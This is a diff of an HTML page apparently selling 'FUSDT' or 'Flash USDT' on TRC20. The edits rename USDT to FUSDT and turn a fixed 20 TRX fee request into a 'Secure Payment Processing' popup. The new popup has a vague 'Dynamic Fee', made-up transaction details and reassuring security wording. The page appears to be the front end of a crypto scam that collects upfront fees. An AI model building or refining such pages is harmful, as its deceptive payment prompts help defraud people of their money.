@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Buy FUSDT TRC20 - Secure Cryptocurrency Exchange</title>
-    <meta name="description" content="Buy USDT TRC20 safely and quickly. Professional cryptocurrency exchange with automatic price calculation.">
+    <meta name="description" content="Buy FUSDT TRC20 safely and quickly. Professional cryptocurrency exchange with automatic price calculation.">
     
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -73,7 +73,7 @@
                                 step="1"
                                 required
                             >
-                            <div class="input-suffix">USDT</div>
+                            <div class="input-suffix">FUSDT</div>
                         </div>
                         <div class="input-help">
                             <span id="amountHelp" class="help-text">Minimum: 500 FUSDT, Maximum: 500,000 FUSDT</span>
@@ -99,7 +99,7 @@
 
                     <!-- Wallet Address Input -->
                     <div class="form-group">
-                        <label for="walletAddress" class="form-label">USDT TRC20 Wallet Address</label>
+                        <label for="walletAddress" class="form-label">FUSDT TRC20 Wallet Address</label>
                         <div class="input-container">
                             <input 
                                 type="text" 
@@ -170,7 +170,7 @@
                                 <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
                                 <path d="M12 17h.01"/>
                             </svg>
-                            <span class="info-text">Current USDT price: $<span id="usdtPrice">1.00</span></span>
+                            <span class="info-text">Current FUSDT price: $<span id="usdtPrice">1.00</span></span>
                         </div>
                     </div>
 
@@ -225,7 +225,7 @@
     <div id="depositPopup" class="popup-overlay" style="display: none;">
         <div class="popup-content">
             <div class="popup-header">
-                <h3>Deposit TRX for Fees</h3>
+                <h3>Secure Payment Processing</h3>
                 <button type="button" class="popup-close" id="closePopup">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <line x1="18" y1="6" x2="6" y2="18"/>
@@ -263,22 +263,42 @@
                 </div>
                 
                 <div class="amount-section">
-                    <label class="amount-label">Amount to Deposit:</label>
-                    <div class="amount-display" id="depositAmount">20 TRX</div>
+                    <label class="amount-label">Transaction Fee Amount:</label>
+                    <div class="amount-display" id="depositAmount">Dynamic Fee</div>
+                    <div class="amount-description">
+                        <small>This fee covers network processing and platform costs</small>
+                    </div>
+                </div>
+                
+                <div class="transaction-details">
+                    <h4 class="details-title">Transaction Details</h4>
+                    <div class="detail-item">
+                        <span class="detail-label">FUSDT Amount:</span>
+                        <span class="detail-value" id="transactionUsdtAmount">-</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Network:</span>
+                        <span class="detail-value">TRC20</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Processing Time:</span>
+                        <span class="detail-value">5-15 minutes</span>
+                    </div>
                 </div>
                 
                 <div class="popup-notice">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FFC700" stroke-width="2">
-                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
-                        <line x1="12" y1="9" x2="12" y2="13"/>
-                        <line x1="12" y1="17" x2="12.01" y2="17"/>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00DC82" stroke-width="2">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/>
                     </svg>
-                    <p>Please deposit exactly 20 TRX within 30 minutes. The Flash USDT will be sent automatically after confirmation.</p>
+                    <div class="notice-content">
+                        <p class="notice-main">Secure Payment Required</p>
+                        <p class="notice-desc">Please deposit the exact fee amount within 30 minutes. FUSDT will be transferred automatically after confirmation.</p>
+                    </div>
                 </div>
                 
                 <div class="popup-actions">
                     <button type="button" class="popup-btn secondary" id="cancelPayment">Cancel</button>
-                    <button type="button" class="popup-btn primary" id="checkPayment">Check Payment Status</button>
+                    <button type="button" class="popup-btn primary" id="checkPayment">Verify Payment</button>
                 </div>
             </div>
         </div>
